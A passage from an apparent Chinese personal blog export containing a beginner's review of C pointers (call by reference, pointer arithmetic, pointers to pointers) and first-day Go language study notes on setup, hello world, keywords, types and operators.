<h4 id="1-1-2-引用调用"><a href="#1-1-2-引用调用" class="headerlink" title="1.1.2 引用调用"></a>1.1.2 引用调用</h4><p>在这里我们来介绍引用调用，这里我们要说到指针（C语言当时我学习感觉抽象的一个地方），如果你对此比较蒙，可以先跳过去，看后面我对于指针的解释再回头回顾。</p>
<p>我们先对上述程序进行简单修改，加入指针。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200228172100529.png" data-fancybox="group" data-caption="image-20200228172100529" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200228172100529.png" alt="image-20200228172100529" title="image-20200228172100529"></a></p>
<p>如图所示，我们的代码执行结果，这里就变了，变成了我们在里面修改也涉及到外面的数值变化了。</p>
<p>那么这有什么不同于传参呢。</p>
<p>我们再次深入一下，从内存看，我们的代码直接调用的那一块内存，指针其实就是指向了一块内存地址，这块内存地址实际上已经被我们的实参绑定，即使我们的函数中的形参是个指针变量，但是我们操作的确实实参的内存。</p>
<p>举个例子来说，就相当于我有一支笔，传参就是你想要跟我这支笔一样的，于是你拿过我这只笔看了看，去买了一根跟我这个一样笔，相对于我来说，我这只笔，并没有变化，只是借给你看了一下。引用就不是这样了，就相当于你不想买，你来借用我的笔，然后你不小心把笔弄坏了，笔坏了，自然会影响到我一样。这就是两者的不同之处。</p>
<h3 id="1-2-指针的二三事"><a href="#1-2-指针的二三事" class="headerlink" title="1.2 指针的二三事"></a>1.2 指针的二三事</h3><h4 id="1-2-1-指针的简介，指针的运算，数组指针"><a href="#1-2-1-指针的简介，指针的运算，数组指针" class="headerlink" title="1.2.1 指针的简介，指针的运算，数组指针"></a>1.2.1 指针的简介，指针的运算，数组指针</h4><p>​        当初刚学习C语言的时候，由于大学前没接触过计算机，很是头疼，当时上来就学C就很乱，现在回头一看，感觉甚是清晰，深入学习了一些知识，所以在这里，我们捡出来指针，来学习一下。</p>
<p>其实指针我们就可以理解为一个储存地址的变量，学习过微机原理汇编语言的我们知道系统的内存堆栈等信息。</p>
<p>我们可以利用&amp; 来访问一个内存地址。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  var = <span class="number">20</span>;   <span class="comment">/* 声明一个实际变量 */</span></span><br><span class="line">   <span class="keyword">int</span>  *ip;        <span class="comment">/* 定义指针变量 */</span></span><br><span class="line"> </span><br><span class="line">   ip = &amp;var;  <span class="comment">/* 在指针变量中存储 var 的地址 */</span></span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Address of var variable: %p\n"</span>, &amp;var  );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 在指针变量中存储的地址 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Address stored in ip variable: %p\n"</span>, ip );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 使用指针访问值 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of *ip variable: %d\n"</span>, *ip );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看到  指针变量其实存储的就是一个地址的值，那么在这个内存地址中肯定要存在着内容或者为空，所以我们可以用*来访问这个内存中的内容。</p>
<p>其实对于当时来说这里虽然说是第一次学习，但是仔细想想想的明白，但是如果加入数组指针什么的就比较抽象了。</p>
<p>这里找到了一个例子，能够先帮助我们了解指向数组的指针与指针的运算。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX = <span class="number">3</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  var[] = &#123;<span class="number">10</span>, <span class="number">100</span>, <span class="number">200</span>&#125;;</span><br><span class="line">   <span class="keyword">int</span>  i, *ptr;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 指针中的数组地址 */</span></span><br><span class="line">   ptr = var;</span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; MAX; i++)</span><br><span class="line">   &#123;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"存储地址：var[%d] = %x\n"</span>, i, ptr );</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"存储值：var[%d] = %d\n"</span>, i, *ptr );</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* 移动到下一个位置 */</span></span><br><span class="line">      ptr++;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229181057244.png" data-fancybox="group" data-caption="image-20200229181057244" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229181057244.png" alt="image-20200229181057244" title="image-20200229181057244"></a></p>
<p>我们看到这里，每次我们的存储地址加4个字节，这个正好是我们Int型数据的大小，所以我们得知，所谓对于指针的运算就是对于内存的运算。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229182821840.png" data-fancybox="group" data-caption="image-20200229182821840" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229182821840.png" alt="image-20200229182821840" title="image-20200229182821840"></a></p>
<p>我们看这张图片，说白了就是我们对于内存地址的运算，指针数组其实就是在内存里面占据了一个连续的内存地址。如果懵逼可以去了解一下汇编语言中的数据段代码段堆栈段等等，相信你会更加清晰。</p>
<h4 id="1-2-2-指向指针的指针"><a href="#1-2-2-指向指针的指针" class="headerlink" title="1.2.2 指向指针的指针"></a>1.2.2 指向指针的指针</h4><p>这里我们来说一个像套娃一样的东西，指向指针的指针，对于初学者来说，如果指针那一块比较蒙圈，这里肯定也会特别蒙圈的。所以我在回顾的时候决定特别的提及一下。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229191734605.png" data-fancybox="group" data-caption="image-20200229191734605" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229191734605.png" alt="image-20200229191734605" title="image-20200229191734605"></a></p>
<p>我们首先来看一下简单的描述。很简单实际上就是一个指针指向了另外一个指针的地址，而另外一个指针里面呢存储的是一个变量的地址。试想一下我们改变那个指针1的内容会发生什么？</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  var;</span><br><span class="line">   <span class="keyword">int</span>  *ptr;</span><br><span class="line">   <span class="keyword">int</span>  **pptr;</span><br><span class="line">   var = <span class="number">3000</span>;</span><br><span class="line">   ptr = &amp;var;</span><br><span class="line">   pptr = &amp;ptr;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 使用 pptr 获取值 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of var = %d\n"</span>, var );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value available at *ptr = %d\n"</span>, *ptr );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value available at **pptr = %d\n"</span>, **pptr);</span><br><span class="line"></span><br><span class="line">   **pptr=<span class="number">4000</span>; </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"next!!!!!!!!!!!\n"</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value of var = %d\n"</span>, var );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value available at *ptr = %d\n"</span>, *ptr );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Value available at **pptr = %d\n"</span>, **pptr); </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>​    </p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229210504313.png" data-fancybox="group" data-caption="image-20200229210504313" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200229210504313.png" alt="image-20200229210504313" title="image-20200229210504313"></a></p>
<p>我们看到后面我们修改了第一个指针的内容随即全部改变，其实就可以理解为一个链。</p>
<p>举一个通俗易懂的例子，还拿我的笔说（这可能是一个漂亮的笔），上次bob借走我的笔，之后bob的暗恋对象amyy看上了这只笔，bob见色起意，就没经过的同意把我的笔借给了amy，amy一不小心就把我的笔给弄坏了，然后还给了Bob，然后Bob又把我的笔还给我，但是笔到了我的手里经过amy的一番操作我的笔已经坏掉了。</p>
<p>这个例子中我就是那个变量，bob相当于指针2，amy相当于指针1，不知道说到这里你是不是对这个概念清晰了一点呢？</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​        好了今天花了一些时间来复习了一下从前刚开始学习遇到问题的一些地方，可能会对作为初学者的你有所帮助，回头看看看来清新了不少，学知识当然要学出自己的见解最好，如果我的解释您觉得有问题，可以留言给我，我看到了会及时改正！下一节我们会深入说一下C语言甩下的尾巴以及一些数据结构的入门东西！</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>GO语言学习笔记DAY1</title>
    <url>/2020/01/08/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%20%20%20%20%20%20DAY%201/</url>
    <content><![CDATA[<h1 id="GO语言学习笔记-DAY-1"><a href="#GO语言学习笔记-DAY-1" class="headerlink" title="GO语言学习笔记       DAY 1"></a>GO语言学习笔记       DAY 1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        由于本人会的语言不多，python,c,汇编只能算了解，不能算会，说会，这个词不知道如何定义会，只是能用他们实现一些需求，python用的多一点，安全方面，写个脚本写个爬虫，也算挺方便的。最近接触到了golang，瞬间被他所吸引，性能不错，而且也比较多功能，对比与java而言，性能也是高了不少，社区环境也不错，感觉未来大有作为，而且也可以实现大多数需求，为此，我打算抽出一段时间学习go语言。</p>
<h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1.环境安装"></a>1.环境安装</h2><p>​    我的环境实在windows下部署的，后面可能考虑到部署到Linux上，因为我的个人pc不是很方便，我现在用的是go+vscode。这个配置也比较简单。</p>
<p>首先你得有VSCODE，这个就不说了，你用其他编辑器也OK，自己喜欢就行。</p>
<p>Windows上go安装简直是傻瓜式的，直接下载，自己打开msi文件，指定一个安装路径，然后配置系统变量。</p>
<p><a href="https://golang.google.cn/dl/" target="_blank" rel="noopener">https://golang.google.cn/dl/</a></p>
<p>在上边的地址下载对应版本的golang。</p>
<p>前面的过程类似java，但是在配置vscode的时候，我们需要注意一下，</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191227191958912.png" data-fancybox="group" data-caption="image-20191227191958912" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191227191958912.png" alt="image-20191227191958912" title="image-20191227191958912"></a></p>
<p>首先搜索go，第一个就是，安装，然后去配置一下json文件。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191227192239208.png" data-fancybox="group" data-caption="image-20191227192239208" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20191227192239208.png" alt="image-20191227192239208" title="image-20191227192239208"></a></p>
<p>输入setting 查到go config字样的字段，点击编辑json的文件。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"go.buildOnSave"</span>: <span class="string">"workspace"</span>,</span><br><span class="line">　　　　<span class="attr">"go.lintOnSave"</span>: <span class="string">"package"</span>,</span><br><span class="line">　　　　<span class="attr">"go.vetOnSave"</span>: <span class="string">"package"</span>,</span><br><span class="line">　　　　<span class="attr">"go.buildTags"</span>: <span class="string">""</span>,</span><br><span class="line">　　　　<span class="attr">"go.buildFlags"</span>: [],</span><br><span class="line">　　　　<span class="attr">"go.lintFlags"</span>: [],</span><br><span class="line">　　　　<span class="attr">"go.vetFlags"</span>: [],</span><br><span class="line">　　　　<span class="attr">"go.coverOnSave"</span>: <span class="literal">false</span>,</span><br><span class="line">　　　　<span class="attr">"go.useCodeSnippetsOnFunctionSuggest"</span>: <span class="literal">false</span>,</span><br><span class="line">　　　　<span class="attr">"go.formatOnSave"</span>: <span class="literal">true</span>,</span><br><span class="line">　　　　<span class="attr">"go.formatTool"</span>: <span class="string">"goreturns"</span>,</span><br><span class="line">　　　　"go.goroot": "G:/GO",			#这里修改成你的go目录</span><br><span class="line">　　　　"go.gopath": "G:/GOPATH",           #这里修改成你配置的环境变量</span><br><span class="line">　　　　"go.gocodeAutoBuild": false,</span><br><span class="line">　　　　"files.autoSave":"onFocusChange",</span><br><span class="line">　　　　"launch": &#123;</span><br><span class="line">　　　　　　"version": "0.2.0",</span><br><span class="line">　　　　　　"configurations": [</span><br><span class="line">　　　　　　　　&#123;</span><br><span class="line">　　　　　　　　　　<span class="attr">"name"</span>: <span class="string">"GoLaunch"</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"type"</span>: <span class="string">"go"</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"request"</span>: <span class="string">"launch"</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"mode"</span>: <span class="string">"debug"</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"remotePath"</span>: <span class="string">""</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"port"</span>: <span class="number">2345</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"host"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"program"</span>: <span class="string">"$&#123;fileDirname&#125;"</span>,</span><br><span class="line">　　　　　　　　　　<span class="attr">"env"</span>: &#123;</span><br><span class="line">　　　　　　　　　　　　<span class="attr">"GOPATH"</span>:<span class="string">"E:/gowork"</span></span><br><span class="line">　　　　　　　　　　&#125;,</span><br><span class="line">　　　　　　　　　　<span class="attr">"args"</span>: [],</span><br><span class="line">　　　　　　　　　　<span class="attr">"showLog"</span>: <span class="literal">true</span></span><br><span class="line">　　　　　　　　&#125;</span><br><span class="line">　　　　　　]</span><br><span class="line">　　　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>按照我注释中的提示即可。（配置完成，重启vscode即可完成）。（过程比较简单，如果有问题，请留言，我看到了会及时回复）</p>
<h2 id="2-GO语言的简单实践"><a href="#2-GO语言的简单实践" class="headerlink" title="2.GO语言的简单实践"></a>2.GO语言的简单实践</h2><h3 id="2-1-Hello-GO"><a href="#2-1-Hello-GO" class="headerlink" title="2.1 Hello GO"></a>2.1 Hello GO</h3><p>​        本来呢。我们在学习一门语言之前，我们会先巴拉巴拉这些语言有什么特性啊，当前应用领域啊，流行不流行啊，好不好工作啊，之类的。我们在这里也不说了，既然学习一门语言，肯定有多方面因素啦。</p>
<p>​        首先我们老生长谈，从hello.go开始，每一门语言的必修课。</p>
<p>​        构建一个hello.go程序，写入以下代码。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">package</span> main</span><br><span class="line"><span class="number">2</span> <span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="number">3</span> <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">4</span>	 fmt.Printf(<span class="string">"Hello World!\n"</span>)</span><br><span class="line"><span class="number">5</span> &#125;</span><br></pre></td></tr></table></figure></div>

<p>到此为止我们的简单go输出就完成了，解释一下</p>
<p>第一行</p>
<p>main  学习语言肯定都有数，主要的意思，在这里go语言给我们定义一个可执行程序的包名，由于没有深入学习，在这里我猜想是一个程序的入口，如果我们一个程序好多文件，那么在这个目录下面GO在编译执行的时候回首先来找这个主要的MAIN包。在这里GO语言像C++那样通过包管理命名空间。</p>
<p>第二行</p>
<p>Import 这个在pyhton是无所不知的，我们用于引入一个包，就像C的Include，python的import一样，在这里面我们引入的fmt是我们的标准输入/输出包。</p>
<p>第三行 func mian(){}</p>
<p>主函数，程序的入口，主函数，类似于C语言。</p>
<p>第四行  调用fmt包里面的Printf函数，打印一个字符串出来（注意，不管是windows还是linux平台这里区分大小写）</p>
<p>在这里我们简单总结这一小节的内容</p>
<h3 id="2-2-小结"><a href="#2-2-小结" class="headerlink" title="2.2 小结"></a>2.2 小结</h3><p>通过如上，我们总结一下GO语言的几点基本特性。</p>
<p>​    1    GO程序的后缀为  .go</p>
<p>​    2    区分大小写</p>
<p>​    3    函数开头是func 暂时没有见到定义的类型，后面的结构类似于C语言，方法调用基本与其他语言一致，利用.</p>
<p>由于我的程序是在VSCODE下执行的，编译与执行都一并了，如果我们在命令行情况下执行，那么我们先编译在执行</p>
<p>在Linux下面</p>
<p>go build hello.go</p>
<p>./hello</p>
<p>就可以产生以上效果。</p>
<h2 id="3-GO语言基础"><a href="#3-GO语言基础" class="headerlink" title="3 GO语言基础"></a>3 GO语言基础</h2><p>学习任何语言都必不可少的一关，便是我们找找关键字啊，学学规则啊，这里我们来简单的介绍一下GO语言的关键字，基础规则等等信息。</p>
<h3 id="3-1-标识符"><a href="#3-1-标识符" class="headerlink" title="3.1 标识符"></a>3.1 标识符</h3><p>GO语言的标识符与C语言一样，数字字母下划线不能够以数字开头即可。</p>
<h3 id="3-2-GO语言关键字"><a href="#3-2-GO语言关键字" class="headerlink" title="3.2 GO语言关键字"></a>3.2 GO语言关键字</h3><p>相对于其他语言GO语言只有25个关键字，这个相对来说很少了，真的很少。</p>
<p>我们分为三类</p>
<p>引导程序主体的关键字8个</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span>		<span class="comment">//定义包名</span></span><br><span class="line"><span class="keyword">import</span>	    <span class="comment">//导入包名</span></span><br><span class="line"><span class="keyword">const</span>       <span class="comment">//声明常量</span></span><br><span class="line"><span class="keyword">var</span>         <span class="comment">//声明变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span>        //定义函数</span></span><br><span class="line"><span class="function"><span class="title">defer</span>       //延迟执行关键字</span></span><br><span class="line"><span class="function"><span class="title">go</span>          //用于并发</span></span><br><span class="line"><span class="function"><span class="title">return</span>      //函数返回关键字</span></span><br></pre></td></tr></table></figure></div>

<p>用于数据结构的关键字</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>    <span class="comment">//定义结构类型的关键字</span></span><br><span class="line"><span class="keyword">interface</span> <span class="comment">//定义接口给的关键字</span></span><br><span class="line"><span class="keyword">map</span>       <span class="comment">//创建map类型的关键字</span></span><br><span class="line"><span class="keyword">chan</span>      <span class="comment">//声明或者创建通道类型的关键字</span></span><br></pre></td></tr></table></figure></div>

<p>控制程结构的关键字</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ···<span class="keyword">else</span>···     <span class="comment">//条件语句</span></span><br><span class="line"><span class="keyword">for</span>   <span class="keyword">range</span>  <span class="keyword">break</span>  <span class="keyword">continue</span>   <span class="comment">//for循环使用的关键字</span></span><br><span class="line"><span class="keyword">switch</span>  <span class="keyword">select</span>  <span class="keyword">type</span>  <span class="keyword">case</span>  <span class="keyword">default</span>  <span class="keyword">fallthrough</span>  <span class="comment">//switch和select语句使用的关键字</span></span><br><span class="line"><span class="keyword">goto</span>               <span class="comment">//跳转的关键字（这个貌似好多语言都给禁用了，因为这个很受争议）</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-3-GO语言数据类型"><a href="#3-3-GO语言数据类型" class="headerlink" title="3.3 GO语言数据类型"></a>3.3 GO语言数据类型</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">数值</span><br><span class="line"><span class="keyword">byte</span> <span class="keyword">int</span>  <span class="keyword">int8</span> <span class="keyword">int16</span> <span class="keyword">int32</span> <span class="keyword">int64</span></span><br><span class="line"><span class="keyword">uint</span>  <span class="keyword">uint8</span>  <span class="keyword">uint16</span>  <span class="keyword">uint32</span> <span class="keyword">uint64</span>  <span class="keyword">uintptr</span></span><br><span class="line"><span class="keyword">float32</span>  <span class="keyword">float64</span></span><br><span class="line"><span class="keyword">complex64</span>  <span class="keyword">complex128</span></span><br><span class="line"></span><br><span class="line">字符串</span><br><span class="line"><span class="keyword">string</span>  <span class="keyword">rune</span></span><br><span class="line"></span><br><span class="line">接口</span><br><span class="line">error</span><br><span class="line"></span><br><span class="line">布尔型</span><br><span class="line"><span class="keyword">bool</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-4-内置函数和标识符"><a href="#3-4-内置函数和标识符" class="headerlink" title="3.4 内置函数和标识符"></a>3.4 内置函数和标识符</h3><p>内置函数</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="built_in">make</span>  <span class="built_in">new</span>  <span class="built_in">len</span>  <span class="built_in">cap</span>  <span class="built_in">append</span> <span class="built_in">copy</span>  <span class="built_in">panic</span>  <span class="built_in">recover</span>  <span class="built_in">close</span>  <span class="built_in">complex</span>  <span class="built_in">real</span>  <span class="built_in">print</span>  </span><br><span class="line"><span class="built_in">println</span>  image</span><br></pre></td></tr></table></figure></div>

<p>我们发现这里面也有许多我们的老朋友了。在这里面我们也来介绍一下一些我们的标识符。</p>
<p>标识符</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span>    <span class="literal">false</span> <span class="comment">//真与假</span></span><br><span class="line"><span class="literal">iota</span>          <span class="comment">//用于连续枚举的声明中</span></span><br><span class="line"><span class="literal">nil</span>           <span class="comment">//指针，指针引用类型的默认值（PS：很头疼的指针又来了，涉及深点来说可以说是一个内存地址，不知道对不对当时学C语言的时候是这么理解的，后面学习好好思考，把这个问题搞明白）</span></span><br></pre></td></tr></table></figure></div>

<h3 id="3-5-操作符与分割符"><a href="#3-5-操作符与分割符" class="headerlink" title="3.5 操作符与分割符"></a>3.5 操作符与分割符</h3><p>这里面介绍一下GO语言的一些操作符，用于简化编程以及完成一些位运算。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">算数运算符</span><br><span class="line">+ - * / %</span><br><span class="line"></span><br><span class="line">位于算符</span><br><span class="line">&amp;  |  ^  &amp;^ &gt;&gt;   &lt;&lt;</span><br><span class="line"></span><br><span class="line">赋值运算符</span><br><span class="line">:=	=	+=	-=	*=	/=	%=	|=	^=	&amp;^=	&gt;&gt;=	&lt;&lt;=</span><br><span class="line"></span><br><span class="line">比较运算符</span><br><span class="line">&gt; &gt;= &lt; &lt;= != ==</span><br><span class="line"></span><br><span class="line">括号</span><br><span class="line">() 	&#123;&#125;	[]</span><br><span class="line"></span><br><span class="line">逻辑运算符</span><br><span class="line">&amp;&amp;  ||  !</span><br><span class="line"></span><br><span class="line">自增自减</span><br><span class="line">++	--	</span><br><span class="line"></span><br><span class="line">其他</span><br><span class="line">;	,	:	.	...	&lt;-</span><br></pre></td></tr></table></figure></div>

<p>除此之外还有诸如好多概念，由于这里不是教材，我也不可能介绍的太细致，如果作为新手来说入门的话呢，实在不会可以先百度，不行呢我们在交流。</p>
<p>在这里我们通过对于这些基本内容的了解，我们也总结出来一个go语言程序的简单架构。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span>   xxxx  <span class="comment">//包名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  （</span><br><span class="line">		<span class="string">""</span>    <span class="comment">//这里面引用各种需要的包</span></span><br><span class="line"></span><br><span class="line">）</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">xxx</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">函数</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="3-6-常量与变量"><a href="#3-6-常量与变量" class="headerlink" title="3.6  常量与变量"></a>3.6  常量与变量</h3><p>GO语言我观察到有一个从前没有见过的变量声明</p>
<p>:=   短变量生成，经过查阅，这个只能够在函数中生效。</p>
<p>正常的变量声明是</p>
<p>var   变量名    数据类型     =    值</p>
<p>我们可以在这个例子中看到</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200110211149823.png" data-fancybox="group" data-caption="image-20200110211149823" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/images/image-20200110211149823.png" alt="image-20200110211149823" title="image-20200110211149823"></a></p>
<p>变量实际是内存地址里面存放的值，具体的解析过程根据不同的数据类型来决定。GO语言的内存是自动管理回收的，实现十分灵活。</p>
<p>常量就是一个名称绑定一块内存地址，而且这个内存地址里面的东西不可变。在这里我也知道了这个iota标识符的作用，一开始我不知道这是干什么用的，这里解释一下iota用于常量声明，是一个自增的值，可以说是枚举变量。举个例子</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">go</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span>(</span><br><span class="line"></span><br><span class="line">​	c0	= 	<span class="literal">iota</span></span><br><span class="line"></span><br><span class="line">​	c1	=	<span class="literal">iota</span></span><br><span class="line"></span><br><span class="line">​	c2	=	<span class="literal">iota</span></span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>这里面c0,c1,c2的值就分别变为0，1，2</p>
<h2 id="3-小结"><a href="#3-小结" class="headerlink" title="3.小结"></a>3.小结</h2><p>​        这里简单的学习了一下go的基本语法，以及一些简单的内容，初步感觉这个在pyhton，java，c等语言有着一定的相同点，另外最近事情也比较多，一心也不能多用，可能一天也只能挤出来几十分钟的时间来学习GO语言，不过这只是个开始，后面我们会进行更加的深入。</p>
]]></content>
      <categories>
        <category>安全之路</category>
      </categories>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>对于主机DNS服务器出现问题的解决办法以及思考</title>
